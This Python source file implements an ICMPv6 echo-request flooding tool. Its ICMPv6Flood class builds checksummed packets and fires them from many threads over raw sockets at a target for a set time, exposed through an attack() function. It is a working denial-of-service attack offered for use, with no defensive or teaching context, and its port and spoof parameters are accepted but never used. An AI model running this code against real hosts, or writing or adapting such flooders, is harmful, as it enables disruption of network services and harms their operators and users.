import socket
import struct
import random
import threading
import time

class ICMPv6Flood:
    def __init__(self, target, port, threads, duration, spoof=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.stop_event = threading.Event()

    def _checksum(self, data):
        if len(data) % 2 == 1:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def _build_icmpv6_echo(self):
        icmp_type = 128  # Echo Request
        icmp_code = 0
        icmp_check = 0
        icmp_id = random.randint(1, 65535)
        icmp_seq = random.randint(1, 65535)
        payload = random._urandom(32)
        pseudo = socket.inet_pton(socket.AF_INET6, self.target) + struct.pack('!I', len(payload)+8) + b'\x00\x00\x00\x3a'
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
        full = header + payload
        icmp_check = self._checksum(pseudo + full)
        return struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq) + payload

    def _attack(self):
        try:
            sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
        except Exception:
            print("[!] IPv6 raw socket not available")
            return
        packet = self._build_icmpv6_echo()
        while not self.stop_event.is_set():
            try:
                sock.sendto(packet, (self.target, 0))
            except Exception:
                pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._attack)
            t.daemon = True
            t.start()
            threads.append(t)
        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False):
    flood = ICMPv6Flood(target, port, threads, duration, spoof)
    flood.start()
